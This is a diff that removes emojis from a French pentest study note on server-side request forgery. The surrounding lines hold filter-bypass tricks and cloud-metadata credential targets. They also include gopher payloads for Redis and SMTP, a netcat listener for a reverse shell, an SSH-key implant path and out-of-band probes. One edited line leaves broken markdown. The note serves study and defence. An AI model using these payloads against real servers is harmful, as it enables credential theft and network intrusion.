@@ -12,7 +12,7 @@ statut: publie
 
 
 
-# 🌐 SSRF — Server-Side Request Forgery
+# SSRF — Server-Side Request Forgery
 
 > [!info] **En 1 phrase**
 > SSRF = forcer le **serveur** à effectuer des requêtes **à notre place** en manipulant une **URL contrôlée**
@@ -22,7 +22,7 @@ statut: publie
 
 ---
 
-## 🎯 Concept
+## Concept
 
 ```mermaid
 flowchart LR
@@ -32,13 +32,13 @@ flowchart LR
     B -->|réponse brute| A
 ```
 
-> [!info] 💡 **Pourquoi ça marche**
+> [!info] **Pourquoi ça marche**
 > L'app accepte une **URL en entrée** (paramètre, webhook, import, proxy d'image, redirect...) et la fetch
 > côté serveur. La source est **confiante** (proche du réseau interne) → le firewall ne filtre pas l'intérieur.
 
 ---
 
-## 🧭 Définition & distinctions
+## Définition & distinctions
 
 > SSRF = vulnérabilité où l'attaquant **force un serveur à faire des requêtes vers une destination non
 > prévue**. Le serveur traite des URLs/IP fournies par l'utilisateur **sans validation suffisante**.
@@ -78,7 +78,7 @@ return response
 
 ---
 
-## 🎯 Cibles par défaut
+## Cibles par défaut
 
 > Les SSRF visent par défaut les services sur **localhost** ou cachés dans le réseau interne.
 
@@ -146,12 +146,12 @@ http://0xc0a80101     = 192.168.1.1
 http://0xa9fea9fe     = 169.254.169.254
 ```
 
-> [!tip] 💡 **Calcul rapide** : `2130706433 = 127 << 24 | 0 << 16 | 0 << 8 | 1`.
+> [!tip] **Calcul rapide** : `2130706433 = 127 << 24 | 0 << 16 | 0 << 8 | 1`.
 > Outil : **[ipfuscator](https://github.com/dwisiswant0/ipfuscator)** génère toutes les représentations alternatives d'une IP (Go).
 
 ---
 
-## 🔀 Bypass de filtres
+## Bypass de filtres
 
 ### 1. Redirections DNS / domaines contrôlés
 
@@ -204,7 +204,7 @@ Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
 Address: 169.254.169.254
 ```
 
-> [!tip] 💡 **Comment ça marche** : TTL très court (ex: 0s) → chaque résolution DNS peut donner une IP différente.
+> [!tip] **Comment ça marche** : TTL très court (ex: 0s) → chaque résolution DNS peut donner une IP différente.
 > Le premier lookup (validation) et le second (connexion) ne retombent pas sur la même IP.
 
 ### 4. Abuser des divergences de parsing URL
@@ -228,7 +228,7 @@ Comportement de `http://1.1.1.1 &@2.2.2.2# @3.3.3.3/` selon la librairie :
 | `requests` + navigateurs | `2.2.2.2` (redirection) |
 | `urllib` (Python 3) | `3.3.3.3` |
 
-> [!warning] ⚠️ **`@` et `#`** : `user@host` force le parseur à voir `host` comme cible alors que la vraie
+> [!warning] `@` et `#`** : `user@host` force le parseur à voir `host` comme cible alors que la vraie
 > connexion va vers `user` ; `#fragment` fait ignorer le début par certains validators. Toujours tester
 > plusieurs variantes.
 
@@ -283,7 +283,7 @@ jar:ftp://127.0.0.1!/
 
 ---
 
-## 📡 Exploitation via les URL schemes
+## Exploitation via les URL schemes
 
 ### `file://` — lecture de fichiers
 
@@ -340,12 +340,12 @@ gopher://[host]:[port]/[type][selector]
 gopher://localhost:25/_MAIL%20FROM:<attacker@example.com>%0D%0A
 ```
 
-> [!tip] 💡 **Gopher + SSRF = RCE** : les chaînes Redis/Memcached/Tomcat permettent d'écrire des fichiers,
-> planter des crons, ou rejouer des commandes → voir la section **🧬 Chaînes Gopher** ci-dessous.
+> [!tip] **Gopher + SSRF = RCE** : les chaînes Redis/Memcached/Tomcat permettent d'écrire des fichiers,
+> planter des crons, ou rejouer des commandes → voir la section **Chaînes Gopher** ci-dessous.
 
 ---
 
-## ☁️ Metadata cloud — le jackpot
+## Metadata cloud — le jackpot
 
 > L'endpoint `169.254.169.254` (link-local) est accessible **depuis les instances cloud uniquement**. Un SSRF
 > le transforme en **vol de credentials IAM** = pivot complet dans le compte cloud.
@@ -371,7 +371,7 @@ X-aws-ec2-metadata-token-ttl-seconds: 21600
 X-aws-ec2-metadata-token: <TOKEN>
 ```
 
-> [!warning] ⚠️ **IMDSv2** : depuis 2023 (defense en profondeur AWS), `curl http://169.254.169.254/...`
+> [!warning] **IMDSv2** : depuis 2023 (defense en profondeur AWS), `curl http://169.254.169.254/...`
 > renvoie `401` si le token est exigé. Un SSRF **HTTP GET classique ne peut pas faire de PUT**
 > (certaines librairies/fonctions limitées par schéma ne le permettent pas) → testez quand même, des instances
 > restent en IMDSv1.
@@ -424,7 +424,7 @@ https://kubernetes.default.svc/api/v1/namespaces/default/pods   # exige un token
 
 ---
 
-## 🛠️ Exploitation selon la stack
+## Exploitation selon la stack
 
 | Stack | Particularités |
 |---|---|
@@ -449,7 +449,7 @@ https://kubernetes.default.svc/api/v1/namespaces/default/pods   # exige un token
 
 ---
 
-## 🙈 Blind SSRF
+## Blind SSRF
 
 > Quand **la réponse n'est pas lisible** (erreur générique, page figée, aucune sortie), il faut basculer sur des
 > canaux indirects.
@@ -489,7 +489,7 @@ Hystrix Dashboard, W3 Total Cache, Docker, Gitlab Prometheus Redis Exporter.
 
 ---
 
-## 🧬 Chaînes Gopher — SSRF → RCE
+## Chaînes Gopher — SSRF → RCE
 
 > Le schéma `gopher://` parle **TCP brut** : on peut "rejouer" le protocole d'un service interne. Généré
 > automatiquement par **[Gopherus](https://github.com/tarunkant/Gopherus)**.
@@ -515,12 +515,12 @@ nc -lvnp 4444
 # OU écrire une clé publique SSH dans /root/.ssh/authorized_keys
 ```
 
-> [!tip] 💡 **Gopher en 3 règles** : `_` après le port = le premier octet à envoyer est après `%0d%0a` ;
+> [!tip] **Gopher en 3 règles** : `_` après le port = le premier octet à envoyer est après `%0d%0a` ;
 > chaque ligne de commande est préfixée par `*N` (RESP) ; `%0d%0a` (CRLF) sépare tout.
 
 ---
 
-## 🧰 Outils
+## Outils
 
 | Outil | Usage |
 |---|---|
@@ -545,7 +545,7 @@ curl -s http://2130706433/    # doit répondre comme http://127.0.0.1/
 
 ---
 
-## 🧪 Labs
+## Labs
 
 - PortSwigger Web Security Academy — SSRF (basique localhost, back-end, blacklist, whitelist, open redirect) : https://portswigger.net/web-security/all-labs#server-side-request-forgery
 - Root-Me — Server Side Request Forgery : https://www.root-me.org/en/Challenges/Web-Server/Server-Side-Request-Forgery
@@ -553,7 +553,7 @@ curl -s http://2130706433/    # doit répondre comme http://127.0.0.1/
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Réponse | Détail |
 |---|---|
@@ -570,23 +570,23 @@ curl -s http://2130706433/    # doit répondre comme http://127.0.0.1/
 
 ---
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!tip] 💡 **Comment distinguer un SSRF exploitable**
+> [!tip] **Comment distinguer un SSRF exploitable**
 > 1. Repérer les endpoints qui **prennent une URL/domaine en entrée** (import, webhook, proxy d'image, générateur de miniatures, validateurs de lien, redirect).
 > 2. Envoyer `http://127.0.0.1:22` vs `http://127.0.0.1:81` → différence de réponse/timing = requête serveur.
 > 3. Envoyer `http://COLLABORATOR.oastify.com` → un hit DNS = **blind SSRF** confirmé même sans sortie.
 > 4. Si le paramètre est **intégré dans une URL existante** (ex: `https://api.com/load?host=x`), tester la manipulation du path/host.
 
-> [!warning] ⚠️ **Full ≠ Partial ≠ Blind** : adapte la technique à ce que tu vois. Full → metadata cloud et
+> [!warning] **Full ≠ Partial ≠ Blind** : adapte la technique à ce que tu vois. Full → metadata cloud et
 > lecture fichiers. Partial → port scan. Blind → OOB uniquement, ne perds pas de temps sur des payloads de sortie.
 
-> [!tip] 💡 **Ne jamais faire confiance à une URL fournie**
+> [!tip] **Ne jamais faire confiance à une URL fournie**
 > Même si l'app a l'air d'être "un simple proxy d'image", c'est un serveur avec accès interne. Toute URL
 > acceptée = une porte vers le réseau. Un **open redirect sur un domaine autorisé** devient une passerelle
 > pour le SSRF (valider le domaine du redirect, puis suivre vers l'interne).
 
-> [!warning] ⚠️ **Pièges classiques**
+> [!warning] **Pièges classiques**
 > - `localhost`/`127.0.0.1` peuvent être filtrés → passe par `0.0.0.0`, `[::]`, IP décimales/octales/hex, `nip.io`, DNS rebinding, redirect 307.
 > - **302 ≠ 307** : après un 302 certains clients ne conservent pas la méthode/le body → préférer 307/308.
 > - **DNS rebinding** : le serveur peut résoudre 2 fois ; garder le TTL à 0 et alterner les réponses.
@@ -595,19 +595,19 @@ curl -s http://2130706433/    # doit répondre comme http://127.0.0.1/
 > - Ne jamais rejouer une chaîne gopher avec des CRLF mal encodés : chaque `\r\n` doit être `%0d%0a`.
 > - SSRF **aveugle** : si aucune réponse, pense aux chaînes blind-ssrf-chains (Consul, Jenkins, Docker) avant de te déclarer bloqué.
 
-> [!tip] 💡 **SSRF → pivot interne**
+> [!tip] **SSRF → pivot interne**
 > L'interne expose souvent des services mal protégés (Redis, Jenkins, dashboards, Consul). Le SSRF est une
 > **porte d'entrée vers tout un réseau** : scanne les ports internes, cherche les services d'admin, et
 > enchaîne vers le RCE (chaînes gopher, blind-ssrf-chains).
 
 ---
 
-## 🔗 Liens
+## Liens
 
-- [[XSS (Cross-Site Scripting)|🖼️ XSS]] — upgrade d'un SSRF faible en XSS (SVG + JavaScript)
-- [[Injection SQL|💾 SQLi]] — souvent combiné au SSRF pour toucher les BDD internes
-- [[LFI et RFI|📂 LFI / RFI]] — mêmes primitives de lecture de fichiers
-- [[Injection de commandes|🐚 Injection de commandes]] — l'aboutissement RCE
-- → Note complète : [[03 - Exploitation Web|🌍 Exploitation Web]]
-- 📚 Source : [PayloadsAllTheThings — Server Side Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md)
-- 🔍 Recherches : Orange Tsai — *A New Era Of SSRF, Exploiting URL Parsers* (Black Hat 2017)
+- [[XSS (Cross-Site Scripting)| XSS]] — upgrade d'un SSRF faible en XSS (SVG + JavaScript)
+- [[Injection SQL| SQLi]] — souvent combiné au SSRF pour toucher les BDD internes
+- [[LFI et RFI| LFI / RFI]] — mêmes primitives de lecture de fichiers
+- [[Injection de commandes| Injection de commandes]] — l'aboutissement RCE
+- → Note complète : [[03 - Exploitation Web| Exploitation Web]]
+- Source : [PayloadsAllTheThings — Server Side Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md)
+- Recherches : Orange Tsai — *A New Era Of SSRF, Exploiting URL Parsers* (Black Hat 2017)
